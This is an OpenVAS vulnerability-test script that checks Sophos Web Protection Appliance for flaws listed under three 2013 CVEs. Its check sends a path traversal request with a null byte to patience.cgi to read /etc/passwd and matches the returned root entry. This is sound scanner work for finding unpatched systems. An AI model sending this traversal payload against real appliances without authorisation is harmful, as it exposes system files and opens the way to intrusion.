###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sophos_web_appliance_mult_vuln_03_2013.nasl 11 2013-10-27 10:12:02Z jan $
#
# Sophos Web Protection Appliance Web Interface Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Sophos Web Protection Appliance Web Interface is prone to multiple vulnerabilities.

1) Unauthenticated local file disclosure
   Unauthenticated users can read arbitrary files from the filesystem with the
   privileges of the 'spiderman' operating system user.

2) OS command injection
   Authenticated users can execute arbitrary commands on the underlying
   operating system with the privileges of the 'spiderman' operating system user.

3) Reflected Cross Site Scripting (XSS)";


tag_solution = "The vendor released version 3.7.8.2 to address these issues. Please see the
references and contact the vendor for information on how to obtain and
apply the updates.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103688";

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_cve_id("CVE-2013-2641","CVE-2013-2642","CVE-2013-2643");
 script_tag(name:"cvss_base", value:"9.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");
 script_name("Sophos Web Protection Appliance Web Interface Multiple Vulnerabilities");
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-04-04 14:28:20 +0200 (Thu, 04 Apr 2013)");
 script_description(desc);
 script_xref(name:"URL" , value:"http://www.sophos.com/en-us/support/knowledgebase/118969.aspx");
 script_summary("Determine if it is possible to read /etc/passwd");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 443);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);

url = '/index.php';

if(http_vuln_check(port:port, url:url,pattern:"<title>Sophos Web Appliance")) {

  url = '/cgi-bin/patience.cgi?id=../../../../../../../etc/passwd%00';

  if(buf = http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {

    desc = desc + '\n\nBy requesting the url\n' + url + '\nit was possible to retrieve the file /etc/paswd:\n\n' + buf + '\n';

    security_hole(port:port, data:desc);
    exit(0);

  }

  exit(99);

}

exit(0);

